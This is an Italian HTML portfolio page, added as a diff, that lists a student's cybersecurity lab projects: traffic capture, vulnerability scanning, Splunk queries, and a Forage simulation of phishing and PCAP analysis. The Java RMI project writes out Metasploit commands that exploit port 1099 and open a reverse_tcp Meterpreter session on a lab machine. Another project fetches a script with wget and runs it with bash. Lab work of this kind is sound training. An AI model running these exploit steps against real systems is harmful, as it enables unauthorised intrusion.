@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Progetti Cybersecurity – Isabelle Adjetey</title>
+  <style>
+    body { font-family: 'Segoe UI', sans-serif; background-color: #f4f4f4; padding: 2em; margin: 0; }
+    h1 { text-align: center; color: #1a237e; }
+    .project {
+      background-color: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      padding: 1.5em;
+      margin: 2em auto;
+      max-width: 900px;
+    }
+    .project h2 { color: #0d47a1; margin-bottom: 0.5em; }
+    .project p { margin: 0.4em 0; }
+    .project img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      margin: 1em 0;
+    }
+    iframe {
+      width: 100%;
+      height: 500px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-top: 1em;
+    }
+    .tags {
+      color: #555;
+      font-size: 0.9em;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>📁 Progetti in Cybersecurity</h1>
+
+
+  <div class="project">
+  <h2>🌐 Simulazione Client-Server con Intercettazione HTTPS/HTTP</h2>
+  <p><strong>Tool:</strong> Kali Linux (192.168.32.100), Windows 7 (192.168.32.101), BIND9, Apache (HTTP/HTTPS), Wireshark, Chrome/Firefox</p>
+  <p><strong>Obiettivi:</strong><br>
+    Configurare DNS per epicode.internal → 192.168.32.100;<br>
+    attivare server HTTPS con certificato autofirmato;<br>
+    catturare traffico HTTPS e HTTP;<br>
+    analizzare differenze in termini di visibilità e sicurezza
+  </p>
+  <p><strong>Risultati:</strong><br>
+    Identificati MAC address di sorgente e destinazione;<br>
+    traffico HTTPS criptato (payload non leggibile, solo handshake TLS visibile);<br>
+    traffico HTTP in chiaro (richieste e risposte completamente leggibili)
+  </p>
+
+  <div class="project-pdf">
+    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M1.pdf" target="_blank">
+      Vai al PDF di svolgimento del progetto
+    </a>
+  </div>
+
+  <p class="tags">#DNS #HTTPS #HTTP #Wireshark #NetworkLab #Security</p>
+</div>
+
+
+<div class="project">
+  <h2>🎮 GameShell Shell Familiarization</h2>
+  <p><strong>Tool:</strong> Kali Linux, apt, shell utilities (gettext, man-db, procps, psmisc, nano, tree, bsdmainutils, x11-apps), wget</p>
+  <p><strong>Obiettivi:</strong><br>
+    Installare GameShell per esercitarsi con i comandi di shell in ambiente Kali Linux
+  </p>
+  <p><strong>Installazione:</strong><br>
+    sudo apt update<br>
+    sudo apt install gettext man-db procps psmisc nano tree bsdmainutils x11-apps wget<br>
+    wget https://github.com/phyver/GameShell/releases/download/latest/gameshell.sh
+  </p>
+  <p><strong>Avvio del gioco:</strong><br>
+    bash gameshell.sh
+  </p>
+  <p><strong>Sviluppo del gioco:</strong><br>
+    Cercate di completare quanti più livelli possibili
+  </p>
+  <div class="project-pdf">
+    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M2%20-%20Gameshell.pdf" target="_blank">
+      Vai al PDF di svolgimento del progetto su GitHub
+    </a>
+  </div>
+  <p class="tags">#GameShell #ShellExercise #KaliLinux</p>
+</div>
+
+<div class="project">
+  <h2>🔍 Vulnerability Assessment & Remediation su Metasploitable</h2>
+  <p><strong>Tool:</strong> Kali Linux, Nmap, Nessus, iptables</p>
+  <p><strong>Traccia & Requisiti:</strong><br>
+    Effettuare una scansione completa sul target Metasploitable;<br>
+    Selezionare da 2 a 4 vulnerabilità critiche (evidenziate in giallo);<br>
+    Implementare azioni di rimedio (patch o regole firewall);<br>
+    iReseguire la scansione e confrontare i risultati
+  </p>
+  <p><strong>Consegna:</strong></p>
+  <ul>
+    <li>
+      <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/ScanzioneInizio.pdf" target="_blank">
+        📄 ScansioneInizio.pdf
+      </a>  
+      (grafico vulnerabilità iniziali)
+    </li>
+    <li>
+      <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/RemediationMeta.pdf" target="_blank">
+        📄 RemediationMeta.pdf
+      </a>  
+      (screenshot e spiegazione dei passaggi di remediation)
+    </li>
+    <li>
+      <a href="https://github.com/tuo-username/metasploitable-remediation/ScansioneFine.pdf" target="_blank">
+        📄 ScansioneFine.pdf
+      </a>  
+      (grafico vulnerabilità dopo le modifiche)
+    </li>
+  </ul>
+  <p class="tags">#Metasploitable #VulnerabilityAssessment #Nmap #Nessus #Remediation #iptables</p>
+</div>
+
+<div class="project">
+  <h2>🛠️ Java RMI Exploitation su Metasploitable</h2>
+  <p><strong>Tool:</strong> Kali Linux (192.168.11.111), Metasploit Framework, Metasploitable (192.168.11.112)</p>
+  <p><strong>Traccia & Requisiti:</strong><br>
+    La macchina vittima espone un servizio Java RMI vulnerabile sulla porta 1099.  
+    Utilizzare Metasploit per ottenere una sessione Meterpreter.<br>
+    Kali IP: 192.168.11.111 – Metasploitable IP: 192.168.11.112
+  </p>
+  <p><strong>Procedura:</strong><br>
+    • msfconsole<br>
+    • use exploit/multi/misc/java_rmi_server<br>
+    • set RHOST 192.168.11.112<br>
+    • set RPORT 1099<br>
+    • set PAYLOAD java/meterpreter/reverse_tcp<br>
+    • set LHOST 192.168.11.111<br>
+    • exploit
+  </p>
+  <p><strong>Evidenze raccolte:</strong><br>
+    • ip addr (configurazione di rete)<br>
+    • ip route show (tabella di routing)<br>
+    • <em>altri comandi e output rilevanti</em>
+  </p>
+  <div class="project-pdf">
+    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M4.pdf" target="_blank">
+      Vai al PDF di svolgimento del progetto su GitHub
+    </a>
+  </div>
+  <p class="tags">#JavaRMI #Metasploit #Meterpreter #Exploit #Metasploitable</p>
+</div>
+
+<div class="project">
+  <h2>🛡️ Web App Security Analysis & Response</h2>
+  <p><strong>Traccia & Requisiti:</strong><br>
+    Con riferimento alla figura in slide 2, rispondere ai seguenti quesiti sulla protezione e gestione di un’applicazione Web esposta in DMZ.
+  </p>
+  <p><strong>Quesiti e Soluzioni:</strong></p>
+  <ol>
+    <li>
+      <strong>Azioni preventive:</strong><br>
+      Identificare e posizionare filtri WAF o input‐validation per prevenire SQLi e XSS.  
+      <em>(Modificare slide 2 evidenziando i filtri a livello di WAF e di codice applicativo.)</em>
+    </li>
+    <li>
+      <strong>Impatti sul business:</strong><br>
+      Un DDoS di 10 minuti interrompe il servizio.  
+      Impatto = 10 min × 1.500 €/min = 15.000 €.  
+      Proposte preventive: CDN con rate‐limiting, soluzioni di anti‐DDoS.
+    </li>
+    <li>
+      <strong>Response:</strong><br>
+      In caso di infezione malware, isolare il server infetto (network quarantine) senza rimuovere l’accesso all’attaccante.  
+      <em>(Aggiornare slide 2 con la VLAN di quarantena e regole di ACL sul firewall.)</em>
+    </li>
+    <li>
+      <strong>Soluzione completa:</strong><br>
+      Combinare le azioni preventive (punto 1) e la response (punto 3) in un unico diagramma.
+    </li>
+    <li>
+      <strong>Modifica “più aggressiva” (opzionale):</strong><br>
+      Introdurre un IDS/IPS centralizzato e segmentazione della rete interna per mitigare ulteriormente gli attacchi (punto 2).
+    </li>
+  </ol>
+  <div class="project-pdf">
+    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M5.pdf" target="_blank">
+      Vai al PDF di svolgimento del progetto su GitHub
+    </a>
+  </div>
+  <p class="tags">#WebSecurity #SQLi #XSS #DDoS #IncidentResponse #WAF #NetworkSegmentation</p>
+</div>
+
+<div class="project">
+  <h2>📊 Splunk Log Analysis Lab</h2>
+  <p><strong>Tool:</strong> Splunk Enterprise, tutorialdata.zip</p>
+  <p><strong>Obiettivi:</strong><br>
+    Importare i dati “tutorialdata.zip” in Splunk ed eseguire query SPL per analizzare autenticazioni SSH e errori server.</p>
+  <p><strong>Query Principali:</strong><br>
+    1. Tentativi di accesso falliti “Failed password”:<br>
+       <code>index=main "Failed password" | table _time, src_ip, user, message</code><br>
+    2. Sessioni SSH riuscite per djohnson:<br>
+       <code>index=main "session opened for user" user="djohnson" | table _time, user, uid</code><br>
+    3. Tentativi falliti da 86.212.199.60:<br>
+       <code>index=main "Failed password" src_ip="86.212.199.60" | table _time, user, dest_port</code><br>
+    4. IP con più di 5 tentativi falliti:<br>
+       <code>index=main "Failed password" | stats count by src_ip | where count > 5</code><br>
+    5. Internal Server Error:<br>
+       <code>index=main status=500 OR "Internal Server Error" | table _time, src_ip, message</code>
+  </p>
+  <p><strong>Conclusioni:</strong><br>
+    L’analisi evidenzia un piccolo cluster di IP responsabili di ripetuti tentativi di “Failed password” (brute-force) e errori 500 sporadici, suggerendo l’introduzione di rate-limiting e ulteriori controlli di stabilità applicativa.</p>
+  <div class="project-github">
+    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M6.pdf" target="_blank">
+      Vai al repository GitHub di Splunk Log Analysis
+    </a>
+  </div>
+  <p class="tags">#Splunk #LogAnalysis #SSH #SIEM #SecurityAnalytics</p>
+</div>
+<div class="project">
+  <h2>🛡️ ANZ Cyber Security Management – Job Simulation (Forage)</h2>
+  <p><strong>Durata:</strong> Giugno 2025</p>
+  <p><strong>Descrizione:</strong><br>
+    Esperienza immersiva in cybersecurity offerta da ANZ tramite la piattaforma Forage.  
+    Il tirocinio prevedeva attività di analisi investigativa su email sospette e traffico di rete simulato, con obiettivo di rilevare minacce digitali, comprendere comportamenti malevoli e migliorare le competenze forensi.
+  </p>
+  <p><strong>Certificato di completamento:</strong>  
+    <a href="https://forage-uploads-prod.s3.amazonaws.com/completion-certificates/AKkAyEwWc8wjPxx9n/Hf4QMESoFeQwXPsiH_AKkAyEwWc8wjPxx9n_JnnS6HC3k6choTWuP_1749768064410_completion_certificate.pdf" target="_blank">
+      🏅 Visualizza certificato ANZ Forage
+    </a>
+  </p>
+
+  <h3>📧 Task 1 – Analisi Email Sospette</h3>
+  <p><strong>Obiettivo:</strong> Classificare 7 email simulate in base al livello di rischio.</p>
+  <p><strong>Risultati:</strong><br>
+    Identificati modelli di phishing, link e allegati malevoli, social engineering.  
+    Redatto report dettagliato con spiegazioni per ogni email.
+  </p>
+  <ul>
+    <li><a href="task1/Task 1 - Answer.docx" target="_blank">📄 Risposte Task 1</a></li>
+    <li><a href="task1/Emails to Investigate.pdf" target="_blank">📄 Email da analizzare</a></li>
+  </ul>
+
+  <h3>📡 Task 2 – Analisi PCAP e File Occulti</h3>
+  <p><strong>Obiettivo:</strong> Investigare un file PCAP simulato per rilevare immagini nascoste, documenti sospetti e traffico anomalo.</p>
+  <p><strong>Risultati:</strong><br>
+    Utilizzato Wireshark, HxD e CyberChef per recuperare contenuti cifrati, file embedded e immagini steganografiche.  
+    Identificato ZIP mascherato da PDF e documenti compromettenti.
+  </p>
+  <ul>
+    <li><a href="task2/Task 2 - Answer Template.docx" target="_blank">📄 Report Task 2</a></li>
+    <li><a href="task2/images/" target="_blank">🖼️ Immagini recuperate</a></li>
+    <li><a href="task2/files/" target="_blank">📑 Documenti analizzati</a></li>
+  </ul>
+
+  <p class="tags">#CyberSecurity #Forage #Phishing #PCAP #Steganografia #ANZ</p>
+</div>
+
+  
+
+</body>
+</html>
